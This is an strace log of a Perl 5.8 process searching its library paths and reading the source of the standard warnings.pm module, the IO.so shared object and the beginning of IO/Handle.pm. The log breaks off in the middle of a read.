18439 12:54:35.857976 stat64("/usr/lib/perl5/warnings.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.857991 stat64("/usr/lib/perl5/warnings.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.858004 stat64("/usr/share/perl5/warnings.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.858016 stat64("/usr/share/perl5/warnings.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.858029 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.858041 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.858054 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.858066 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
18439 12:54:35.858087 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 9
18439 12:54:35.858101 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff77d38) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.858112 _llseek(9, 0, [0], SEEK_CUR) = 0
18439 12:54:35.858130 read(9, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
18439 12:54:35.858523 brk(0x81b6000)    = 0x81b6000
18439 12:54:35.858540 brk(0x81b5000)    = 0x81b5000
18439 12:54:35.858620 read(9, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
18439 12:54:35.859050 read(9, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
18439 12:54:35.859721 read(9, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
18439 12:54:35.859870 read(9, "", 4096) = 0
18439 12:54:35.859885 close(9)          = 0
18439 12:54:35.860039 _llseek(7, 412, [412], SEEK_SET) = 0
18439 12:54:35.860055 _llseek(7, 0, [412], SEEK_CUR) = 0
18439 12:54:35.860065 close(7)          = 0
18439 12:54:35.860107 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
18439 12:54:35.860132 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
18439 12:54:35.860160 futex(0xb7f54070, 0x81 /* FUTEX_??? */, 2147483647) = 0
18439 12:54:35.860175 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 7
18439 12:54:35.860190 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n
18439 12:54:35.860280 fstat64(7, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
18439 12:54:35.860305 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7f58000
18439 12:54:35.860328 mmap2(0xb7f5c000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x3) = 0xb7f5c000
18439 12:54:35.860371 close(7)          = 0
18439 12:54:35.860517 stat64("/etc/perl/IO/Handle.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.860534 stat64("/etc/perl/IO/Handle.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.860548 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.860561 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.860575 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.860588 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.860602 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.860615 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.860628 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.860640 stat64("/usr/share/perl5/IO/Handle.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.860654 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.860667 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
18439 12:54:35.860688 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 7
18439 12:54:35.860702 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff781e8) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.860714 _llseek(7, 0, [0], SEEK_CUR) = 0
18439 12:54:35.860735 read(7, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: 